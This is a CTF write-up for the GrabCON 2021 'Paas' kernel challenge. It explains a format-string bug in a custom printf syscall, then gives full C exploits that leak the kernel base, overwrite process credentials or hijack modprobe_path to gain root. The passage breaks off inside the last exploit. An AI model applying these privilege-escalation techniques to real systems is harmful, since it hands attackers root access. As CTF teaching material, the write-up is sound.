---
layout: post
title: GrabCON 2021 - Paas
date: 2021-09-10 22:52
category: kernel-pwn
author: stdnoerr
tags: [kernel, writeup]
summary: Write for kernel challenge named "Pass" from GrabCON 2021 CTF.
---

I played GrabCON CTF 2021 to check the challenges. "Pass" especially got my attention because it is a kernel exploitation challenge. I thought it is the best time I work on some kernel challenges. So, I will approach it as a beginner and try to explain as much as I can. I did not solve it during the CTF. Shoutout to `00xc#0275` from Scavengar Security for being the only person who solved it during the CTF. Checkout his [writeup](https://scavengersecurity.com/posts/grabcon-paas/) also. You can download the challenge file [here](https://github.com/stdnoerr/stdnoerr.github.io/tree/master/files/kernel/grabcon_pass/).

# Environment Setup
You get `bzImage`, `run.sh` and `printf.c` files and `initramfs` folder when you extract the provided file.<br>
First we will extract `vmlinux` file from `bzImage` using [this](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) script. `vmlinux` is uncompressed kernel file. But, we need to convert this into an elf file for getting the symbols. For this, I used [this](https://github.com/marin-m/vmlinux-to-elf/) script. I named the elf file `vmlinux_elf`.<br>
Second, we need to change some configuration to be able to debug the challenge. For a gdb connection, add `-gdb tcp::<port>` to the qemu command in `run.sh`. To connect to the connection, start gdb with the `vmlinux_elf` file. Then run `target remote :<port>`. Adding `-S` to the qemu will make it stop until the gdb is connected. I advise to disable kaslr, smep, smap and kpti for the purpose of debugging.<br>
Lastly, to be able to read some files we will change the uid in `initramfs/init` file from `1000` to `0`.<br>
To run the challenge we need to compress the `initramfs` folder to a cpio archive. I used to following `run.sh` file to compile the exploit to test, compress `initramfs` and run qemu. (I ran it inside `initramfs` folder)
```bash
#!/bin/bash

gcc exploit.c -static -o exploit
find . -print0 | cpio --null -ov --format=newc | gzip -1 > ../initramfs.cpio.gz

qemu-system-x86_64 -m 256M -initrd ../initramfs.cpio.gz -kernel ../bzImage -nographic -monitor /dev/null -append "nokaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet" -gdb tcp::9001 -S
```
# Source code analysis
Pass is short for Printf-as-a-syscall. In the provided kernel, a syscall named printf is added which takes an array of `char` pointers and implements some printf functionality. The source code is below: -
```c
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/fdtable.h>

MODULE_LICENSE("GPL");

#ifndef __NR_PRINTF
#define __NR_PRINTF 548
#endif

char *itoa(unsigned long value, char *result, int base) {
    if (base < 2 || base > 36) { *result = '\0'; return result; }

    char* ptr = result, *ptr1 = result, tmp_char;
    unsigned long tmp_value;

    do {
        tmp_value = value;
        value /= base;
        *ptr++ = "zyxwvutsrqponmlkjihgfedcba9876543210123456789abcdefghijklmnopqrstuvwxyz"[35 + (tmp_value - value * base)];
    } while ( value );

    if (tmp_value < 0) *ptr++ = '-';
    *ptr-- = '\0';
    while(ptr1 < ptr) {
        tmp_char = *ptr;
        *ptr--= *ptr1;
        *ptr1++ = tmp_char;
    }
    return result;
}

SYSCALL_DEFINE1(printf, char **, data) {
  int i, j, base_alloc_size, off_from_start, cmp_offset, add_offset, found = 0, written_chars = 0, arg_no = 1;
  long current_arg;

  char *src = data[0];
  base_alloc_size = 8;
  int len = strlen(src);
  char *dest = kmalloc(base_alloc_size, GFP_KERNEL); // allocate base buffer
  memset(dest, 0, len*2); // zero out
  char *new_string = dest;

  for(i = 0; i < len; i++) {
    cmp_offset = 0;
    add_offset = 0;
    if(*src == '%') {

      // check if there is a dollar notation in format string
      for(j = 1; j <= 9; j++) {
        if(*(src+j) == '$') {
          found = 1;
          break;
        }
        else if(*(src+j) == 'p' || *(src+j) == 'n' || *(src+j) == 'h' || *(src+j) == 's' || *(src+j) == 'c') {
          break;
        }
      }

      // if yes, get the position
      if(found) {
        char tmp[8] = {0}, *substr = strchr(src, '$');
        int len = substr - (src+1);
        strncpy(tmp, src+1, len);
        kstrtol(tmp, 10, &current_arg);
        add_offset = strlen(tmp)+1;
        cmp_offset = add_offset;

      } else {
        add_offset = 0x2;
        current_arg = arg_no;
        arg_no++;
      }

      // code for different format strings

      if(*(src+cmp_offset+0x1) == 'p') {
        char num[24] = {0};
        itoa((unsigned long)data[current_arg],num,16);
        off_from_start = dest - new_string;
        new_string = krealloc(new_string,base_alloc_size+strlen(num)+0x2, GFP_KERNEL);
        base_alloc_size += strlen(num);
        dest = new_string + off_from_start;
        strncpy(dest,"0x",2);
        strncpy(dest+2,num,strlen(num));
        dest += strlen(num)+0x2;
        src += add_offset;
        written_chars++;
      }
      else if(*(src+cmp_offset+0x1) == 'n') {
        *(unsigned int *)data[current_arg] = (unsigned int)written_chars;
        src += add_offset;
      }
      else if(*(src+cmp_offset+0x1) == 'h') {
        if(*(src+cmp_offset+0x2) == 'n') {
          *(unsigned short *)data[current_arg] = (unsigned short)written_chars;
          src += (add_offset + 0x1);
        }
        else if(*(src+cmp_offset+0x2) == 'h' && *(src+cmp_offset+0x3) == 'n') {
          *(unsigned char *)data[current_arg] = (unsigned char)written_chars;
          src += (add_offset + 0x2);
        }
      }
      else if(*(src+cmp_offset+0x1) == 's') {
        int string_len = strlen(data[current_arg]);
        off_from_start = dest - new_string;
        new_string = krealloc(new_string,base_alloc_size+string_len, GFP_KERNEL);
        base_alloc_size += string_len;
        dest = new_string + off_from_start;
        strncpy(dest,data[current_arg],strlen(data[current_arg]));
        dest += string_len;
        src += add_offset;
      }
      else if(*(src+cmp_offset+0x1) == 'c') {
        // TODO: implement actual functionality of %c
        src += 0x2;
        written_chars++;
      }
      else if(*(src+cmp_offset+0x1) >= '0' && *(src+cmp_offset+0x1) <= '9') {
        int dbg;
        long len;
        long num;
        char tmp[8] = {0};

        if(found) {
          printk(KERN_ERR "\"c\" format string cannot be used with dollar notation\n");
          kfree(new_string);
          return -1;
        }
        for(j = 0; j < 8; j++) {
          if(j >= 7) {
            printk(KERN_ERR "too long number; len = %ld\n", len);
            kfree(new_string);
            return -1;
          }
          if(*(src+0x1+j) >= '0' && *(src+0x1+j) <= '9');
          else if(*(src+0x1+j) == 'c') {
            len = j;
            break;
          }
          else {
            printk(KERN_ERR "invalid format string\n");
            kfree(new_string);
            return -1;
          }
        }
        strncpy(tmp, (src+cmp_offset+0x1), len);
        kstrtol(tmp, 10, &num);
        written_chars += num;
        src += (len + add_offset);

        // TODO: implement actual functionality of %c

      }

      src += cmp_offset;
    } else {
      off_from_start = dest - new_string;
      new_string = krealloc(new_string,++base_alloc_size, GFP_KERNEL);
      dest = new_string + off_from_start;
      *dest++ = *src++;
      written_chars++;
    }
    found = 0;
  }

  kernel_write(fdget_pos(0).file, new_string, strlen(new_string), 0); // output result
  kfree(new_string); // free buffer
  return 0;
}
```

Reading the code reveals that we can: -
- print a value as pointer.
- print a string.
- write (restricted) int, short and char values.
- use the direct access method to set `current_arg`. (indexes are 0-based)
- use the width feature to increase `written_chars` to whatever value we want.<br>
But, there are no checks. The pointers are not checked if they are userspace pointers or kernelspace. (userspace addresses have their first byte set to null). So, we have arbitrary read and write primitives here. Just like a format string vuln.<br>
Also, there is no null termination of the string to be printed.<br>
The resultant string is written to `stdin`.

# Pre-Exploitation
## Setup
First of all, we need to get output of the syscall. We cannot read it via read, fread, scanf etc. I used fifo pipes for this. I replaced the stdin of my exploit to a fifo. This way the output is written to the fifo file and I can read it using simple file operations.<br>
But, this approach has its own peculiarities. We need to read all the remaining contents of the fifo file before reading any new input, otherwise the outputs get mixed. For this I used `clear_stdin` function to clear the stdin.<br>
Also, fifos are unseekable. So, we cannot change the offset pointer to read any offset.<br>
I created a helper function `read_ptr_stdin` to read a QWORD from the fifo file.<br>
My setup is below: -
```c
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

#define SYSCALL_NO 548

int fd = -1;

__attribute__((constructor)) void init(){
    mkfifo("/home/user/stdin_fifo", 0666);
    freopen("/home/user/stdin_fifo", "r+", stdin);
    fd = open("/home/user/stdin_fifo", O_RDWR);
}

int bytes_left(){
    int nbytes;
    ioctl(fd, FIONREAD, &nbytes);

    return nbytes;
}

int clear_stdin(){
    int size = bytes_left();

    char *buf = malloc(size);
    int ret = read(fd, buf, size);
    free(buf);

    return ret;
}

uint64_t read_ptr_stdin(){
    uint64_t ptr = 0;
    int n = bytes_left();

    if(n > 0){
        read(fd, &ptr, 8);
    }

    return ptr;
}

int main(int argc, char *argv[]){
    char *data[] = {argv[1]};
    syscall(SYSCALL_NO, data);

    int size = bytes_left();

    char *buf = malloc(size);
    read(fd, buf, size);
    printf("%s\n", buf);
}
```

## Getting a leak
Having arbitrary read and write primitives is useless without a kernel leak.<br>
For the leak, I will abuse the fact that there is no null termination.<br>
Since the string is allocated on kernel, there is a high chance that there are string adjacent to out string. In kernel heap, (as far as I know) heap allocations of same size are adjacent to each other (like jemalloc). Upon trial-and-error, I found that giving a 8-byte length string, leaks a heap pointer which is adjacent to out string.<br>
I added `xxd` to `initramfs` to check the raw bytes.
```
/ $ ./exploit 12345678 | xxd
00000000: 3132 3334 3536 3738 50b5 0204 8088 ffff  12345678P.......
00000010: 3a61 2d30 3030 3030 3634 0a              :a-0000064.
```
It turns out that this pointer points to some strings and some pointers. But, after that there is a kernel address.
```
gef➤  telescope 0xffff88800402b550  70
0xffff88800402b550│+0x0000: 0x6f6c2f6572616873  →  0x6f6c2f6572616873
0xffff88800402b558│+0x0008: 0xffff88800402b570  →  0x6f6c2f6572616873  →  0x6f6c2f6572616873                                                                      
0xffff88800402b560│+0x0010: 0x6f6c2f6572616873  →  0x6f6c2f6572616873
0xffff88800402b568│+0x0018: 0xffff88800402b5a0  →  0x6f6c2f6572616873  →  0x6f6c2f6572616873                                                                      
0xffff88800402b570│+0x0020: 0x6f6c2f6572616873  →  0x6f6c2f6572616873
[truncated]
0xffff88800402b760│+0x0210: 0xffffffff82074ec0  →  0x0000000000000000  →  0x0000000000000000                                                                      
[truncated]
```
Thanks to the symbols, it turns out to be the address of `tty_dev_attr_group`.
```
# readelf -Ws ./vmlinux_elf| grep ffffffff82074ec0
 30380: ffffffff82074ec0     0 OBJECT  LOCAL  DEFAULT    2 tty_dev_attr_group
```
Its offset from kernel base (startup_64) is `0xffffffff82074ec0 - 0xffffffff81000000 = 0x1074ec0`.<br>
But the offset between the leaked pointer and between `tty_dev_attr_group` address is not constant. So, we have to leak a couple of values and check each value. I created `get_leak` function for this.<br>
I implemented the arbitrary read in `arb_read` and made a wrapper `arb_read_ptr` around it because sometimes the values had null bytes in them.<br>
```c
uint64_t arb_read(uint64_t ptr){
    clear_stdin();
    char *data[] = {"%s", ptr};
    syscall(SYSCALL_NO, data);
}

uint64_t arb_read_ptr(uint64_t ptr){
    char tmp[8];
    uint64_t ret;
    
    arb_read(ptr);
    ret = read_ptr_stdin();

    if(strlen(&ret) != 8){
        for(int i = 0; i < 8; i++){
            arb_read(ptr + i);
            tmp[i] = read_ptr_stdin() & 0xff;
        }
        ret = *(uint64_t *)tmp;
    }

    return ret;
}

uint64_t get_leak(){
    uint64_t leak, ptr;
    int offset = 0x150; // because the tty_dev_attr_group is always after this offset

    char *data[] = {"12345678"};
    syscall(SYSCALL_NO, data);

    read_ptr_stdin(); // discard "12345678"
    ptr = read_ptr_stdin(); // heap leak
    clear_stdin();

    while((leak & 0xffff) != 0x4ec0){
        leak = arb_read_ptr(ptr + offset);

        offset += 8;
    }

    return leak;
}

int main(int argc, char *argv[]){
    uint64_t ptr = get_leak();

    uint64_t kbase = ptr - 0x1074ec0;

    printf("kernel base: %p\n", kbase);
}
```
# Exploitation
In kernel pwn, our objective is to escalate our privileges to root. It is usually done in two ways.
- Overwriting the uids (uid, gid, euid, egid etc) in `cred` of `task_struct` of the current process.
- Executing `commit_creds(prepare_kernel_creds(0))`.

## What is task_struct and cred?
In linux, every process has a task_struct associated with it. It contains all information about the process (pid, file name, etc). It has a member called `cred` of type `struct cred`. It contains information about the privileges of the process (uid, gid, euid etc).
```c
struct task_struct {
[truncated]

	/* Process credentials: */

	/* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;

	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;

#ifdef CONFIG_KEYS
	/* Cached requested key. */
	struct key			*cached_requested_key;
#endif

	/*
	 * executable name, excluding path.
	 *
	 * - normally initialized setup_new_exec()
	 * - access it with [gs]et_task_comm()
	 * - lock it with task_lock()
	 */
	char				comm[TASK_COMM_LEN];

[truncated]

struct cred {
[truncated]
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
[truncated]
```
You can have a look at their full structure. [task_struct](https://elixir.bootlin.com/linux/v5.13.12/source/include/linux/sched.h#L657) [cred](https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h#L110)
task_struct is stored at a fixed offset (`current_task`) from `__per_cpu_offset`. The `__per_cpu_offset` is an array of pointers to addresses which is fixed for a cpu but is subjected to kaslr (meaning it has a fixed offset from kernel base).
```
# readelf -Ws ./vmlinux_elf| grep -E '__per_cpu_offset| current_task'
 92101: 0000000000016d00     0 OBJECT  GLOBAL DEFAULT  ABS current_task
118643: ffffffff824176a0     0 OBJECT  GLOBAL DEFAULT    2 __per_cpu_offset                     
```
So, the address of task_struct of current process is `*(*__per_cpu_offset[0]+0x16d00)`.
```c
int main(int argc, char *argv[]){
    uint64_t ptr = get_leak();

    uint64_t kbase = ptr - 0x1074ec0;
    uint64_t per_cpu_offset = kbase + 0x14176a0;

    ptr = arb_read_ptr(per_cpu_offset);

    uint64_t task_struct = arb_read_ptr(ptr + 0x16d00);

    printf("kernel base: %p\n", kbase);
    printf("task_struct: %p\n", task_struct);
}
```
You can have a look at [this](https://github.com/slavaim/linux-notes/blob/master/current_task.md) for clearing things.
Let's get to actual exploitation now.

## Overwriting uids in task_struct->cred
As I explained earlier, `task_struct->cred` stores uid, gid, euid etc of the process. For escalating, we can overwrite these to make the kernel think that a process was started by `root`.<br>
For this we need to get the offset of `cred` in `task_struct`. Usually, it is done by [making a kernel module](https://pr0cf5.github.io/ctf/2019/10/10/balsn-ctf-krazynote.html). But, I wanted to have some other solution. I looked at the source code of `prepare_creds` function and it accessed the `cred` member from current `task_struct`. When I decompiled the function I saw the offset used.
```
gef➤  disas prepare_creds 
Dump of assembler code for function prepare_creds:
   0xffffffff8108d1e0 <+0>:     push   r12
   0xffffffff8108d1e2 <+2>:     mov    rdi,QWORD PTR [rip+0x1e06fe7] # 0xffffffff82e941d0
   0xffffffff8108d1e9 <+9>:     mov    esi,0xcc0
   0xffffffff8108d1ee <+14>:    push   rbp
   0xffffffff8108d1ef <+15>:    mov    rbp,QWORD PTR gs:0x16d00  <-- current_task offset
   0xffffffff8108d1f8 <+24>:    call   0xffffffff811de460 <kmem_cache_alloc>
   0xffffffff8108d1fd <+29>:    test   rax,rax
   0xffffffff8108d200 <+32>:    je     0xffffffff8108d341 <prepare_creds+353>
   0xffffffff8108d206 <+38>:    mov    rbp,QWORD PTR [rbp+0x6b8]     <-- cred offset
   0xffffffff8108d20d <+45>:    mov    rdi,rax
   0xffffffff8108d210 <+48>:    mov    ecx,0x16
   0xffffffff8108d215 <+53>:    mov    r12,rax
   0xffffffff8108d218 <+56>:    mov    rsi,rbp
   0xffffffff8108d21b <+59>:    rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
   0xffffffff8108d21e <+62>:    mov    DWORD PTR [rax],0x1
   0xffffffff8108d224 <+68>:    mov    DWORD PTR [rax+0xa0],0x0
   0xffffffff8108d22e <+78>:    mov    rax,QWORD PTR [rax+0x98]
   0xffffffff8108d235 <+85>:    lock inc DWORD PTR [rax]
   0xffffffff8108d238 <+88>:    mov    eax,0x1
[truncated]
```
So, we got `0x6b8` as offset. Let's add this to our exploit.
```c
int main(int argc, char *argv[]){
    uint64_t ptr = get_leak();

    uint64_t kbase = ptr - 0x1074ec0;
    uint64_t per_cpu_offset = kbase + 0x14176a0;

    ptr = arb_read_ptr(per_cpu_offset);

    uint64_t task_struct = arb_read_ptr(ptr + 0x16d00);
    uint64_t current_cred_addr = task_struct + 0x6b8;
    uint64_t current_cred = arb_read_ptr(current_cred_addr);

    printf("kernel base: %p\n", kbase);
    printf("task_struct: %p\n", task_struct);
    printf("current cred: %p\n", current_cred);
}
```
Now we just need to write `0` to the uids. Initially I overwrote all six with zero. Upon trial-and-error, I found out that overwriting only `uid` and `euid` is enough. I changed the uid in `init` back to `1000` to see it in gdb. I found out that the uids start after an int.
```c
int main(int argc, char *argv[]){
    uint64_t ptr = get_leak();

    uint64_t kbase = ptr - 0x1074ec0;
    uint64_t per_cpu_offset = kbase + 0x14176a0;

    ptr = arb_read_ptr(per_cpu_offset);

    uint64_t task_struct = arb_read_ptr(ptr + 0x16d00);
    uint64_t current_cred_addr = task_struct + 0x6b8;
    uint64_t current_cred = arb_read_ptr(current_cred_addr);

    printf("kernel base: %p\n", kbase);
    printf("task_struct: %p\n", task_struct);
    printf("current cred: %p\n", current_cred);

    char *data[] = {"%n%n", 
        current_cred + 1*4, // uid
        current_cred + 5*4  // euid
    };

    syscall(SYSCALL_NO, data);
    system("id; cat /root/flag.txt");
}
```
Unfortunately, we cannot get a shell because our stdin is set to the fifo. I just called `id` to check if the overwrite worked and read the flag.

## Overwrite task_struct->cred to init_cred
If you don't want to overwrite the uids or due to some reason you can only write 8 bytes, you can overwrite current `task_struct->cred` with `init_cred`. `init_cred` is a default `cred` which is used for `init_task`. You can get the address from `vmlinux_elf` and calculate the offset.
```
# readelf -Ws ./vmlinux_elf| grep init_cred
118934: ffffffff8264e400     0 OBJECT  GLOBAL DEFAULT   12 init_cred
```
`0xffffffff8264e400 - 0xffffffff81000000 = 0x164e400`
```c
int main(int argc, char *argv[]){
    uint64_t ptr = get_leak();

    uint64_t kbase = ptr - 0x1074ec0;
    uint64_t per_cpu_offset = kbase + 0x14176a0;

    ptr = arb_read_ptr(per_cpu_offset);

    uint64_t task_struct = arb_read_ptr(ptr + 0x16d00);
    uint64_t current_cred_addr = task_struct + 0x6b8;
    uint64_t init_cred = kbase + 0x164e400;

    printf("kernel base: %p\n", kbase);
    printf("task_struct: %p\n", task_struct);
    printf("current cred address: %p\n", current_cred_addr);
    printf("init_cred: %p\n", init_cred);
}
```
I made a function `write_long` for writing it once because if we write it in parts, a check will result in a segfault. The check is done during `kernel_write` to check whether the file has proper permissions; which is done using the `cred`. If we write in parts, `cred` will point to some other place (maybe non-existent) and will result in segfault.
```c
void write_long(uint64_t where, uint64_t what){
    char fmt[0x50];
    uint32_t part1 = what & 0xffffffff, part2 = what >> 32;
    uint16_t part1_lower = part1 & 0xffff, part1_upper = part1 >> 16;
    uint16_t part2_lower = part2 & 0xffff, part2_upper = part2 >> 16;

    sprintf(fmt, "%%%dc%%1$hn%%%dc%%2$hn%%%dc%%3$hn%%%dc%%4$hn", part1_lower, 
    (part1_upper > part1_lower) ? part1_upper - part1_lower : part1_upper - part1_lower + 0x10000,
    (part2_lower > part1_upper) ? part2_lower - part1_upper : part2_lower - part1_upper + 0x10000,
    (part2_upper > part2_lower) ? part2_upper - part2_lower : part2_upper - part2_lower + 0x10000
    );

    char *data[] = {fmt, where, where + 2, where + 4, where + 6};
    syscall(SYSCALL_NO, data);
}

int main(int argc, char *argv[]){
    uint64_t ptr = get_leak();

    uint64_t kbase = ptr - 0x1074ec0;
    uint64_t per_cpu_offset = kbase + 0x14176a0;

    ptr = arb_read_ptr(per_cpu_offset);

    uint64_t task_struct = arb_read_ptr(ptr + 0x16d00);
    uint64_t current_cred_addr = task_struct + 0x6b8;
    uint64_t init_cred = kbase + 0x164e400;

    printf("kernel base: %p\n", kbase);
    printf("task_struct: %p\n", task_struct);
    printf("current cred address: %p\n", current_cred_addr);
    printf("init_cred: %p\n", init_cred);

    write_long(current_cred_addr, init_cred);
    system("id; cat /root/flag.txt");
}
```

## Modprobe method
This is more of a shortcut especially for ctfs. You can read the details [here](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/). Bascially, it lets us execute any program/script as root. For this, we just need address of `modprobe_path`. Then, write path to out program/script to run as root and execute a script with invalid header. I modified `init` function for making a shell script to get the flag and a file with invalid header. Note that you won't get the output of the shell script, so I used the script to make the flag file world-readable.
```
# readelf -Ws ./vmlinux_elf| grep -E 'modprobe_path'
118942: ffffffff8264ec60     0 OBJECT  GLOBAL DEFAULT   12 modprobe_path
```
`0xffffffff8264ec60 - 0xffffffff81000000 = 0x164ec60`
```c
__attribute__((constructor)) void init(){
    mkfifo("/home/user/check_fifo", 0666);
    freopen("/home/user/check_fifo", "r+", stdin);
    fd = open("/home/user/check_fifo", O_RDWR);

    system("echo '#!/bin/sh\nchmod 777 /root/flag.txt' > /home/user/to_exec.sh; echo -ne '\\xff\\xff\\xff\\xff' > /home/user/invalid; chmod +x /home/user/to_exec.sh; chmod +x /home/user/invalid");
}

void write_byte(uint64_t where, uint8_t what){
    char fmt[0x30];

    sprintf(fmt, "%%%dc%%1$hhn", what);

    char *data[] = {fmt, where};
    syscall(SYSCALL_NO, data);
}

void write_str(uint64_t addr, char *str){
    for(int i = 0; i < strlen(str); i++){
        write_byte(addr + i, str[i]);
    }
}

int main(int argc, char *argv[]){
    uint64_t ptr = get_leak(); // tty_dev_attr_group

    uint64_t kbase = ptr - 0x1074ec0;
    uint64_t modprobe_path = kbase + 0x164ec60;

    printf("kernel base: %p\n", kbase);
    printf("modprobe_path: %p\n", modprobe_path);

    write_str(modprobe_path, "/home/user/to_exec.sh");

    system("/home/user/invalid");
    system("cat /root/flag.txt");
}
```
# Final exploits
## Overwriting uids in task_struct->cred
```c
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

#define SYSCALL_NO 548

int fd = -1;

__attribute__((constructor)) void init(){
    mkfifo("/home/user/stdin_fifo", 0666);
    freopen("/home/user/stdin_fifo", "r+", stdin);
    fd = open("/home/user/stdin_fifo", O_RDWR);
}

int bytes_left(){
    int nbytes;
    ioctl(fd, FIONREAD, &nbytes);

    return nbytes;
}

int clear_stdin(){
    int size = bytes_left();

    char *buf = malloc(size);
    int ret = read(fd, buf, size);
    free(buf);

    return ret;
}

uint64_t read_ptr_stdin(){
    uint64_t ptr = 0;
    int n = bytes_left();

    if(n > 0){
        read(fd, &ptr, 8);
    }

    return ptr;
}

uint64_t arb_read(uint64_t ptr){
    clear_stdin();
    char *data[] = {"%s", ptr};
    syscall(SYSCALL_NO, data);
}

uint64_t arb_read_ptr(uint64_t ptr){
    char tmp[8];
    uint64_t ret;
    
    arb_read(ptr);
    ret = read_ptr_stdin();

    if(strlen(&ret) != 8){
        for(int i = 0; i < 8; i++){
            arb_read(ptr + i);
            tmp[i] = read_ptr_stdin() & 0xff;
        }
        ret = *(uint64_t *)tmp;
    }

    return ret;
}

uint64_t get_leak(){
    uint64_t leak, ptr;
    int offset = 0;

    char *data[] = {"12345678"};
    syscall(SYSCALL_NO, data);

    read_ptr_stdin();
    ptr = read_ptr_stdin();

    printf("%p\n", ptr);    
    clear_stdin();

    while((leak & 0xffff) != 0x4ec0){
        leak = arb_read_ptr(ptr + offset);

        offset += 8;
    }

    return leak;
}

int main(int argc, char *argv[]){
    uint64_t ptr = get_leak();

    uint64_t kbase = ptr - 0x1074ec0;
    uint64_t per_cpu_offset = kbase + 0x14176a0;

    ptr = arb_read_ptr(per_cpu_offset);

    uint64_t task_struct = arb_read_ptr(ptr + 0x16d00);
    uint64_t current_cred_addr = task_struct + 0x6b8;
    uint64_t current_cred = arb_read_ptr(current_cred_addr);

    printf("kernel base: %p\n", kbase);
    printf("task_struct: %p\n", task_struct);
    printf("current cred: %p\n", current_cred);

    char *data[] = {"%n%n", 
        current_cred + 1*4, // uid
        current_cred + 5*4  // euid
    };

    syscall(SYSCALL_NO, data);
    system("id; cat /root/flag.txt");
}
```
## Overwrite task_struct->cred to init_cred
```c
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

#define SYSCALL_NO 548

int fd = -1;

__attribute__((constructor)) void init(){
    mkfifo("/home/user/stdin_fifo", 0666);
    freopen("/home/user/stdin_fifo", "r+", stdin);
    fd = open("/home/user/stdin_fifo", O_RDWR);
}

int bytes_left(){
    int nbytes;
    ioctl(fd, FIONREAD, &nbytes);

    return nbytes;
}

int clear_stdin(){
    int size = bytes_left();

    char *buf = malloc(size);
    int ret = read(fd, buf, size);
    free(buf);

    return ret;
}

uint64_t read_ptr_stdin(){
    uint64_t ptr = 0;
    int n = bytes_left();

    if(n > 0){
        read(fd, &ptr, 8);
    }

    return ptr;
}

uint64_t arb_read(uint64_t ptr){
    clear_stdin();
    char *data[] = {"%s", ptr};
    syscall(SYSCALL_NO, data);
}

uint64_t arb_read_ptr(uint64_t ptr){
    char tmp[8];
    uint64_t ret;
    
    arb_read(ptr);
    ret = read_ptr_stdin();

    if(strlen(&ret) != 8){
        for(int i = 0; i < 8; i++){
            arb_read(ptr + i);
            tmp[i] = read_ptr_stdin() & 0xff;
        }
        ret = *(uint64_t *)tmp;
    }

    return ret;
}

uint64_t get_leak(){
    uint64_t leak, ptr;
    int offset = 0;

    char *data[] = {"12345678"};
    syscall(SYSCALL_NO, data);

    read_ptr_stdin();
    ptr = read_ptr_stdin();

    printf("%p\n", ptr);    
    clear_stdin();

    while((leak & 0xffff) != 0x4ec0){
        leak = arb_read_ptr(ptr + offset);

        offset += 8;
    }

    return leak;
}

void write_long(uint64_t where, uint64_t what){
    char fmt[0x50];
    uint32_t part1 = what & 0xffffffff, part2 = what >> 32;
    uint16_t part1_lower = part1 & 0xffff, part1_upper = part1 >> 16;
    uint16_t part2_lower = part2 & 0xffff, part2_upper = part2 >> 16;

    sprintf(fmt, "%%%dc%%1$hn%%%dc%%2$hn%%%dc%%3$hn%%%dc%%4$hn", part1_lower, 
    (part1_upper > part1_lower) ? part1_upper - part1_lower : part1_upper - part1_lower + 0x10000,
    (part2_lower > part1_upper) ? part2_lower - part1_upper : part2_lower - part1_upper + 0x10000,
    (part2_upper > part2_lower) ? part2_upper - part2_lower : part2_upper - part2_lower + 0x10000
    );

    char *data[] = {fmt, where, where + 2, where + 4, where + 6};
    syscall(SYSCALL_NO, data);
}

int main(int argc, char *argv[]){
    uint64_t ptr = get_leak();

    uint64_t kbase = ptr - 0x1074ec0;
    uint64_t per_cpu_offset = kbase + 0x14176a0;

    ptr = arb_read_ptr(per_cpu_offset);

    uint64_t task_struct = arb_read_ptr(ptr + 0x16d00);
    uint64_t current_cred_addr = task_struct + 0x6b8;
    uint64_t init_cred = kbase + 0x164e400;

    printf("kernel base: %p\n", kbase);
    printf("task_struct: %p\n", task_struct);
    printf("current cred address: %p\n", current_cred_addr);
    printf("init_cred: %p\n", init_cred);

    write_long(current_cred_addr, init_cred);
    system("id; cat /root/flag.txt");
}

```
## Modprobe method
```c
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

#define SYSCALL_NO 548

int fd = -1;

__attribute__((constructor)) void init(){
    mkfifo("/home/user/check_fifo", 0666);
    freopen("/home/user/check_fifo", "r+", stdin);
    fd = open("/home/user/check_fifo", O_RDWR);

    system("echo '#!/bin/sh\nchmod 777 /root/flag.txt' > /home/user/to_exec.sh; echo -ne '\\xff\\xff\\xff\\xff' > /home/user/invalid; chmod +x /home/user/to_exec.sh; chmod +x /home/user/invalid");
}

int bytes_left(){
    int nbytes;
    ioctl(fd, FIONREAD, &nbytes);

    return nbytes;
}

int clear_stdin(){
    int size = bytes_left();

    char *buf = malloc(size);
    int ret = read(fd, buf, size);
    free(buf);

    return ret;
}

uint64_t read_ptr_stdin(){
    uint64_t ptr = 0;
    int n = bytes_left();

    if(n > 0){
        read(fd, &ptr, 8);
    }

    return ptr;
}

uint64_t arb_read(uint64_t ptr){
    clear_stdin();
    char *data[] = {"%s", ptr};
    syscall(SYSCALL_NO, data);
}

uint64_t arb_read_ptr(uint64_t ptr){
    char tmp[8];
    uint64_t ret;
    
    arb_read(ptr);
    ret = read_ptr_stdin();

    if(strlen(&ret) != 8){
        for(int i = 0; i < 8; i++){
            arb_read(ptr + i);
            tmp[i] = read_ptr_stdin() & 0xff;
        }
        ret = *(uint64_t *)tmp;
    }

    return ret;
}

uint64_t get_leak(){
    uint64_t leak, ptr;
    int offset = 0;

    char *data[] = {"12345678"};
    syscall(SYSCALL_NO, data);

    read_ptr_stdin();
    ptr = read_ptr_stdin();

    printf("%p\n", ptr);    
    clear_stdin();

    while((leak & 0xffff) != 0x4ec0){
        leak = arb_read_ptr(ptr + offset);

        offset += 8;
    }

    return leak;
}

void write_byte(uint64_t where, uint8_t what){
    char fmt[0x30];

    sprintf(fmt, "%%%dc%%1$hhn", what);

    char *data[] = {fmt, where};
    syscall(SYSCALL_NO, data);
}

void write_str(uint64_t addr, char *str){
    for(int i = 0; i < strlen(str); i++){
        write_byte(addr + i, str[i]);
    }
}

int main(int argc, char *argv[]){
